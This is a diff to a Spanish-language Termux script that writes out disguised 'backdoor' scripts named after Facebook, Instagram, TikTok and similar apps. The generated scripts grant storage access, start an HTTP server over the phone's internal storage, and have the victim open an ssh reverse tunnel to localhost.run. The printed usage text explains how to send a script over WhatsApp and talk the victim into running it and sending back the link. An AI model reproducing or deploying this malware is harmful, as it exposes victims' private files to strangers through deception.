@@ -65,7 +65,8 @@ clear
 case $opcion in
 1)
 echo "
-cd /sdcard
+apt update -y
+
 #! /bin/bash
 
 setterm -foreground green
@@ -101,6 +102,42 @@ sleep 1
 echo 'Instalando python ...'
 sleep 3
 pkg install python -y
+fi
+
+
+#directory verification
+directory=$(pwd)
+
+
+if which dropbear >/dev/null; then
+sleep 1
+echo ''
+echo  '(dropbear) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(dropbear) No instalado [✗]'
+sleep 1
+echo 'Instalando dropbear ...'
+sleep 3
+pkg install dropbear -y
+fi
+
+
+#directory verification
+directory=$(pwd)
+
+
+if which openssh >/dev/null; then
+sleep 1
+echo ''
+echo  '(openssh) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(openssh) No instalado [✗]'
+sleep 1
+echo 'Instalando openssh ...'
+sleep 3
+pkg install openssh -y
 fi
 clear
 
@@ -128,6 +165,9 @@ echo 'Copie el siguiente codigo y pegelo en una nueva ventana'
 echo ''
 echo 'ssh -R 80:localhost:5443 nokey@localhost.run'
 echo ''
+termux-setup-storage 
+cd /sdcard
+
 python -m http.server 5443
 #
 " >> fre.sh
@@ -140,11 +180,9 @@ setterm -foreground green
 echo 'USO:'
 echo 'Enviar fre.sh le decimos que abra termux si no lo tiene le'
 echo ''
-echo 'pedimos que lo instale en su cell , ya una vez esto le decimos'
+echo 'pedimos que lo instale en su cell , ya una vez esto '
 echo ''
-echo 'que escriba termux-setup-storage y le de enter luego pkg install openssh'
-echo ''
-echo 'le de enter tambien, si es que ya tiene termux entonces no le decimos eso'
+echo 'si es que ya tiene termux entonces no le decimos eso'
 echo ''
 echo 'Bueno una ves esto le enviamos el backdoor fre.sh por su wasap'
 echo ''
@@ -160,13 +198,14 @@ echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
 echo ''
 echo 'despues de eso se le genera un link al final le pedimos que nos envie'
 echo ''
-echo 'el link y listo ya tenemos acceso a su almacenamiento interno'
+echo 'el codigo que está a lado del link y listo ya tenemos acceso a su almacenamiento interno'
 exit
 #
 ;;
 2)
 echo "
-cd /sdcard
+apt update -y
+
 #! /bin/bash
 
 setterm -foreground green
@@ -202,6 +241,42 @@ sleep 1
 echo 'Instalando python ...'
 sleep 3
 pkg install python -y
+fi
+
+
+#directory verification
+directory=$(pwd)
+
+
+if which dropbear >/dev/null; then
+sleep 1
+echo ''
+echo  '(dropbear) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(dropbear) No instalado [✗]'
+sleep 1
+echo 'Instalando dropbear ...'
+sleep 3
+pkg install dropbear -y
+fi
+
+
+#directory verification
+directory=$(pwd)
+
+
+if which openssh >/dev/null; then
+sleep 1
+echo ''
+echo  '(openssh) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(openssh) No instalado [✗]'
+sleep 1
+echo 'Instalando openssh ...'
+sleep 3
+pkg install openssh -y
 fi
 clear
 
@@ -226,6 +301,9 @@ echo 'Copie el siguiente codigo y pegelo en una nueva ventana'
 echo ''
 echo 'ssh -R 80:localhost:5444 nokey@localhost.run'
 echo ''
+termux-setup-storage 
+cd /sdcard
+
 python -m http.server 5444
 #
 " >> pase.sh
@@ -238,11 +316,9 @@ setterm -foreground green
 echo 'USO:'
 echo 'Enviar pase.sh le decimos que abra termux si no lo tiene le'
 echo ''
-echo 'pedimos que lo instale en su cell , ya una vez esto le decimos'
+echo 'pedimos que lo instale en su cell , ya una vez esto '
 echo ''
-echo 'que escriba termux-setup-storage y le de enter luego pkg install openssh'
-echo ''
-echo 'le de enter tambien, si es que ya tiene termux entonces no le decimos eso'
+echo 'si es que ya tiene termux entonces no le decimos eso'
 echo ''
 echo 'Bueno una ves esto le enviamos el backdoor pase.sh por su wasap'
 echo ''
@@ -256,13 +332,14 @@ echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
 echo ''
 echo 'despues de eso se le genera un link al final le pedimos que nos envie'
 echo ''
-echo 'el link y listo ya tenemos acceso a su almacenamiento interno'
+echo 'el codigo que está a lado del link y listo ya tenemos acceso a su almacenamiento interno'
 exit
 #
 ;;
 3)
 echo "
-cd /sdcard
+apt update -y
+
 #! /bin/bash
 
 setterm -foreground green
@@ -298,6 +375,42 @@ sleep 1
 echo 'Instalando python ...'
 sleep 3
 pkg install python -y
+fi
+
+
+#directory verification
+directory=$(pwd)
+
+
+if which dropbear >/dev/null; then
+sleep 1
+echo ''
+echo  '(dropbear) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(dropbear) No instalado [✗]'
+sleep 1
+echo 'Instalando dropbear ...'
+sleep 3
+pkg install dropbear -y
+fi
+
+
+#directory verification
+directory=$(pwd)
+
+
+if which openssh >/dev/null; then
+sleep 1
+echo ''
+echo  '(openssh) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(openssh) No instalado [✗]'
+sleep 1
+echo 'Instalando openssh ...'
+sleep 3
+pkg install openssh -y
 fi
 clear
 
@@ -325,6 +438,9 @@ echo 'Copie el siguiente codigo y pegelo en una nueva ventana'
 echo ''
 echo 'ssh -R 80:localhost:5445 nokey@localhost.run'
 echo ''
+termux-setup-storage 
+cd /sdcard
+
 python -m http.server 5445
 #
 " >> facebook.sh
@@ -337,11 +453,9 @@ setterm -foreground green
 echo 'USO:'
 echo 'Enviar facebook.sh le decimos que abra termux si no lo tiene le'
 echo ''
-echo 'pedimos que lo instale en su cell , ya una vez esto le decimos'
+echo 'pedimos que lo instale en su cell , ya una vez esto '
 echo ''
-echo 'que escriba termux-setup-storage y le de enter luego pkg install openssh'
-echo ''
-echo 'le de enter tambien, si es que ya tiene termux entonces no le decimos eso'
+echo 'si es que ya tiene termux entonces no le decimos eso'
 echo ''
 echo 'Bueno una ves esto le enviamos el backdoor facebook.sh por su wasap'
 echo ''
@@ -357,13 +471,14 @@ echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
 echo ''
 echo 'despues de eso se le genera un link al final le pedimos que nos envie'
 echo ''
-echo 'el link y listo ya tenemos acceso a su almacenamiento interno'
+echo 'el codigo que está a lado del link y listo ya tenemos acceso a su almacenamiento interno'
 exit
 #
 ;;
 4)
 echo "
-cd /sdcard
+apt update -y
+
 #! /bin/bash
 
 setterm -foreground green
@@ -399,6 +514,42 @@ sleep 1
 echo 'Instalando python ...'
 sleep 3
 pkg install python -y
+fi
+
+
+#directory verification
+directory=$(pwd)
+
+
+if which dropbear >/dev/null; then
+sleep 1
+echo ''
+echo  '(dropbear) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(dropbear) No instalado [✗]'
+sleep 1
+echo 'Instalando dropbear ...'
+sleep 3
+pkg install dropbear -y
+fi
+
+
+#directory verification
+directory=$(pwd)
+
+
+if which openssh >/dev/null; then
+sleep 1
+echo ''
+echo  '(openssh) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(openssh) No instalado [✗]'
+sleep 1
+echo 'Instalando openssh ...'
+sleep 3
+pkg install openssh -y
 fi
 clear
 
@@ -426,6 +577,9 @@ echo 'Copie el siguiente codigo y pegelo en una nueva ventana'
 echo ''
 echo 'ssh -R 80:localhost:5446 nokey@localhost.run'
 echo ''
+termux-setup-storage 
+cd /sdcard
+
 python -m http.server 5446
 #
 " >> instagram.sh
@@ -440,9 +594,7 @@ echo 'Enviar instagram.sh le decimos que abra termux si no lo tiene le'
 echo ''
 echo 'pedimos que lo instale en su cell , ya una vez esto le decimos'
 echo ''
-echo 'que escriba termux-setup-storage y le de enter luego pkg install openssh'
-echo ''
-echo 'le de enter tambien, si es que ya tiene termux entonces no le decimos eso'
+echo 'si es que ya tiene termux entonces no le decimos eso'
 echo ''
 echo 'Bueno una ves esto le enviamos el backdoor instagram.sh por su wasap'
 echo ''
@@ -458,13 +610,14 @@ echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
 echo ''
 echo 'despues de eso se le genera un link al final le pedimos que nos envie'
 echo ''
-echo 'el link y listo ya tenemos acceso a su almacenamiento interno'
+echo 'el codigo que está a lado del link y listo ya tenemos acceso a su almacenamiento interno'
 exit
 #
 ;;
 5)
 echo "
-cd /sdcard
+apt update -y
+
 #! /bin/bash
 
 setterm -foreground green
@@ -501,6 +654,42 @@ echo 'Instalando python ...'
 sleep 3
 pkg install python -y
 fi
+
+
+#directory verification
+directory=$(pwd)
+
+
+if which dropbear >/dev/null; then
+sleep 1
+echo ''
+echo  '(dropbear) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(dropbear) No instalado [✗]'
+sleep 1
+echo 'Instalando dropbear ...'
+sleep 3
+pkg install dropbear -y
+fi
+
+
+#directory verification
+directory=$(pwd)
+
+
+if which openssh >/dev/null; then
+sleep 1
+echo ''
+echo  '(openssh) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(openssh) No instalado [✗]'
+sleep 1
+echo 'Instalando openssh ...'
+sleep 3
+pkg install openssh -y
+fi
 clear
 
 setterm -foreground green
@@ -527,6 +716,8 @@ echo 'Copie el siguiente codigo y pegelo en una nueva ventana'
 echo ''
 echo 'ssh -R 80:localhost:5447 nokey@localhost.run'
 echo ''
+termux-setup-storage 
+cd /sdcard
 python -m http.server 5447
 #
 " >> tiktok.sh
@@ -541,9 +732,7 @@ echo 'Enviar tiktok.sh le decimos que abra termux si no lo tiene le'
 echo ''
 echo 'pedimos que lo instale en su cell , ya una vez esto le decimos'
 echo ''
-echo 'que escriba termux-setup-storage y le de enter luego pkg install openssh'
-echo ''
-echo 'le de enter tambien, si es que ya tiene termux entonces no le decimos eso'
+echo 'si es que ya tiene termux entonces no le decimos eso'
 echo ''
 echo 'Bueno una ves esto le enviamos el backdoor pase.sh por su wasap'
 echo ''
@@ -559,7 +748,7 @@ echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
 echo ''
 echo 'despues de eso se le genera un link al final le pedimos que nos envie'
 echo ''
-echo 'el link y listo ya tenemos acceso a su almacenamiento interno'
+echo 'el codigo que está a lado del link y listo ya tenemos acceso a su almacenamiento interno'
 #
 exit
 ;;
